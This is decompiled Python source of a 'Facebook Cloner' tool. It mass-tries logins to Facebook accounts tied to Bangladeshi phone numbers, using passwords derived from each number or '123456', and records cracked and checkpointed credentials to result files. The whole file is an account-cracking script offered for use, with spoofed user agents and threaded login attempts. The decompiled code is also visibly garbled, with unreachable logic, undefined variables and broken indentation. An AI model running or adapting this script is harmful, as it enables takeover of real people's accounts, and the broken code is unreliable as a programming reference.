# Source Generated with Decompyle++
# File: bexm.pyc (Python 3.10)

import sys
import time
import os
import requests
import bs4
from bs4 import BeautifulSoup as parser
ses = requests.Session()
import random
from concurrent.futures import futures as cf
from multiprocessing.pool import ThreadPool
user_agents = [
    'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
    'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']

def psb(z):
    pass


def psbn(z):
    pass


def logopsb(z):
    pass


def wl():
    if not os.path.exists('.txt'):
        os.system('touch .txt')


def logout():
    psb('\n    [*] Thanks For Using Our Tool..')
    psb('    [*] Visit Our Github For More Tools..')
    psb('\n      [ https://github.com/Toxic-Noob/ ]\x1b[37m\n')
    os.system('xdg-open https://github.com/Toxic-Noob')


def logo():
    os.system('clear')
    logopsb("\x1b[92m _____         _       ____ _                       \n|_   _|____  _(_) ___ / ___| | ___  _ __   ___ _ __ \n  | |/ _ \\ \\/ / |/ __| |   | |/ _ \\| '_ \\ / _ \\ '__|\n  | | (_) >  <| | (__| |___| | (_) | | | |  __/ |   \n  |_|\\___/_/\\_\\_|\\___|\\____|_|\\___/|_| |_|\\___|_|   \n                                                    ")
    logopsb('\x1b[3;90m\t\t\tA Product Of ToxicNoob\x1b[0;92m')
    time.sleep(0.6)
    logopsb('\x1b[34m\n|****************************************************|\n|\x1b[3m Author   : ToxicNoob                               \x1b[0;34m|\n|\x1b[3m Tool     : Facebook Cloner                         \x1b[0;34m|\n|\x1b[3m Version  : 1.0                                     \x1b[0;34m|\n|\x1b[3m Link     : https://www.github.com/Toxic-Noob/\t     \x1b[0;34m|\n|\x1b[3m Coded By : HunterSl4d3      \t\t     \t     \x1b[0;34m|\n******************************************************')
    time.sleep(0.8)


def choose():
    op = input('\x1b[92m\n    [*] Enter Your Choice:> ')
    if op == '':
        psb('\n    [!] You Must Enter Something..!')
        op = input('\x1b[92m\n    [*] Enter Your Choice:> ')
        if not op == '':
            return op


def gp():
    logo()
    psb('\x1b[92m\n    [*] Choose a Code From Below...\n')
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    codes = '170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139'
    psbn('\x1b[34m' + codes)
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    num = choose()
    if num not in codes:
        psb('\n    [!] Only Choose From The Above Codes...')
        num = choose()
        if not num not in codes:
            return num


def bl():
    logo()
    psb('\x1b[92m\n    [*] Choose a Code From Below...\n')
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    codes = '190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149'
    psbn('\x1b[34m' + codes)
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    num = choose()
    if num not in codes:
        psb('\n    [!] Only Choose From The Above Codes...')
        num = choose()
        if not num not in codes:
            return num


def robi():
    logo()
    psb('\x1b[92m\n    [*] Choose a Code From Below...\n')
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    codes = '180, 181, 182, 183, 184, 185, 186, 187, 188, 189'
    psbn('\x1b[34m' + codes)
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    num = choose()
    if num not in codes:
        psb('\n    [!] Only Choose From The Above Codes...')
        num = choose()
        if not num not in codes:
            return num


def air():
    logo()
    psb('\x1b[92m\n    [*] Choose a Code From Below...\n')
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    codes = '160, 161, 162, 163, 164, 165, 166, 167, 168, 169'
    psbn('\x1b[34m' + codes)
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    num = choose()
    if num not in codes:
        psb('\n    [!] Only Choose From The Above Codes...')
        num = choose()
        if not num not in codes:
            return num


def tele():
    logo()
    psb('\x1b[92m\n    [*] Choose a Code From Below...\n')
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    codes = '150, 151, 152, 153, 154, 155, 156, 157, 158, 159'
    psbn('\x1b[34m' + codes)
    print('\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-\x1b[92m-')
    num = choose()
    if num not in codes:
        psb('\n    [!] Only Choose From The Above Codes...')
        num = choose()
        if not num not in codes:
            return num


def main():
    logo()
    psb('\x1b[92m\n    [*] Select a SIM Provider :')
    print('\n    [01] GrameenPhone')
    print('    [02] Banglalink')
    print('    [03] Robi')
    print('    [04] Airtel')
    print('    [05] Teletalk')
    print('    [##] Exit')
    op = choose().replace('0', '').replace('##', '#')
    if op not in ('1', '2', '3', '4', '5', '#'):
        psb('\n    [*] Choose a Correct Option!!')
        op = choose().replace('0', '').replace('##', '#')
        if op not in ('1', '2', '3', '4', '5', '#') or op == '1':
            num = gp()
        elif op == '2':
            num = bl()
        elif op == '3':
            num = robi()
        elif op == '4':
            num = air()
        elif op == '5':
            num = tele()
        elif op == '#':
            logout()
    main.num = num
    word_data = open('.txt', 'r').readlines()
    logo()
    print('\n')
    print('\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m')
    psb('\x1b[92m    [*] Cracking Started...')
    psb('    [*] Please Be Patient...')
    psb('    [*] Cracking May Take Some Time...')
    psb('\n    [*] To Stop Process Press ctrl then z')
    print('\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m\x1b[33m-\x1b[37m')
    print("\n\x1b[92m    [*] Checkpoint ID's Login After 12/14 Days...\x1b[37m")
    print('\n')
    with cf.ThreadPoolExecutor() as tp:
        tp.map(crack, word_data)
        None(None, None, None)
    if not None:
        pass
    psb('\x1b[92m\n    [*] Cracking Compleate...\n\x1b[37m')


def crack(uid, **kwargs):
    fcode = main.num
    uid = '+880' + fcode + uid
    pwxs = uid[3:14]
    host = 'https://mbasic.facebook.com'
    pass1 = pwxs
    pass2 = pwxs[3:11]
    pass3 = pwxs[5:11]
    pass4 = '123456'
    pwx = [
        pass1,
        pass2,
        pass3,
        pass4]
    ua = random.choice(user_agents)
    
    try:
        kwargs = { }
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({
            'origin': host,
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'accept-encoding': 'gzip, deflate',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'user-agent': ua,
            'Host': ''.join(bs4.re.findall('://(.*?)$', host)),
            'referer': host + '/login/?next&ref=dbl&fl&refid=8',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'content-type': 'application/x-www-form-urlencoded' })
        p = ses.get(host + '/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = [
            'lsd',
            'jazoest',
            'm_ts',
            'li',
            'try_number',
            'unrecognized_tries',
            'login']
        for i in b('input'):
            
            try:
                if i.get('name') in bl:
                    kwargs.update({
                        i.get('name'): i.get('value') })
            finally:
                continue
                continue
                continue
                kwargs.update({
                    'email': uid,
                    'pass': pw,
                    'prefill_contact_point': '',
                    'prefill_source': '',
                    'prefill_type': '',
                    'first_prefill_source': '',
                    'first_prefill_type': '',
                    'had_cp_prefilled': 'false',
                    'had_password_prefilled': 'false',
                    'is_smart_lock': 'false',
                    '_fb_noscript': 'true' })
                re = ses.post(host + '/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', kwargs, **('data',))
                if 'c_user' in ses.cookies.get_dict().keys():
                    ui = uid.replace('\n', '')
                    print('\x1b[92m[ Toxic-OK ] : ' + ui + '  |  ' + pw + '\x1b[37m')
                    file_data = open('results/ok.txt', 'r').read()
                    file_ok = open('results/ok.txt', 'w')
                    file_ok.write(file_data + '\n' + ui + '  |  ' + pw)
                    file_ok.close()
                return None
                if 'checkpoint' in ses.cookies.get_dict().keys():
                    ui = uid.replace('\n', '')
                    print('\x1b[91m[ Toxic-CP ] : ' + ui + '  |  ' + pw + '\x1b[37m')
                    file_data = open('results/cp.txt', 'r').read()
                    file_cp = open('results/cp.txt', 'w')
                    file_cp.write(file_data + '\n' + ui + '  |  ' + pw)
                    file_cp.close()
                return None
                if '<title>error</title>' in re.text.lower():
                    print('\n    [!] Error Occured!!')
                    print('\n    [!] Try Again Later...')
                    sys.exit()
                    continue
                if 'Nomor telepon yang Anda masukkan tidak cocok dengan akun mana saja' in re.text or 'Nombor telefon yang anda masukkan tidak sepadan dengan mana-mana akaun' in re.text:
                    pass
                return None
                if 'someting went wrong' in re.text.lower():
                    file = open('.temp', 'w')
                    file.write(re.text)
                    file.close()
                continue
                return None
                return None



if __name__ == '__main__':
if not os.path.exists('results'):
        os.mkdir('results')
    if not os.path.exists('results/ok.txt'):
        os.system('touch results/ok.txt')
    if not os.path.exists('results/cp.txt'):
        os.system('touch results/cp.txt')
    if os.path.exists('.txt'):
        os.system('rm .txt')
    wl()
    main()
    return None
